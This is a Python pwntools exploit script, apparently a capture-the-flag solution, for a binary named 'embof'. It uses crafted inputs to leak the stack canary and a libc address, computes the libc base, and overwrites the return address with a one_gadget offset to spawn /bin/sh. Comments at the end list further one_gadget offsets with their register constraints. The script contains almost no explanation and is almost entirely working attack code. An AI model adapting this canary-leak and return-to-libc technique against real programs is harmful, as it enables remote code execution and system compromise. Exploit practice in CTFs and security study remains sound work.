#!/usr/bin/python3

from pwn import *

exe = ELF('embof', checksec=False)
libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                b*main+149
                b*main+332
                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('')
else:
        p = process(exe.path)

GDB()
payload = b"noAAAAAAa"
sla(b"?\n", payload)
p.recvuntil(b"noAAAAAA")
canary = u64(p.recvline(keepends=False)[:-1])
print(hex(canary))

payload = b"ofcourse" + flat(
        b"a" * 16
)
sla(b"?\n", payload)
p.recvuntil(b"ofcourseaaaaaaaaaaaaaaaa")
libc_leak = u64(p.recvline(keepends=False).ljust(8, b"\0"))
print(hex(libc_leak))
libc.address = libc_leak - 0x29d90
print(libc.address)

payload = b"a"*8 + flat(
        canary-0x61, 0, libc.address + 0x50a37
)
sla(b":", payload)
p.interactive()

# 0x50a37 posix_spawn(rsp+0x1c, "/bin/sh", 0, rbp, rsp+0x60, environ)
# constraints:
#   rsp & 0xf == 0
#   rcx == NULL
#   rbp == NULL || (u16)[rbp] == NULL

# 0xebcf1 execve("/bin/sh", r10, [rbp-0x70])
# constraints:
#   address rbp-0x78 is writable
#   [r10] == NULL || r10 == NULL
#   [[rbp-0x70]] == NULL || [rbp-0x70] == NULL

# 0xebcf5 execve("/bin/sh", r10, rdx)
# constraints:
#   address rbp-0x78 is writable
#   [r10] == NULL || r10 == NULL
#   [rdx] == NULL || rdx == NULL

# 0xebcf8 execve("/bin/sh", rsi, rdx)
# constraints:
#   address rbp-0x78 is writable
#   [rsi] == NULL || rsi == NULL
#   [rdx] == NULL || rdx == NULL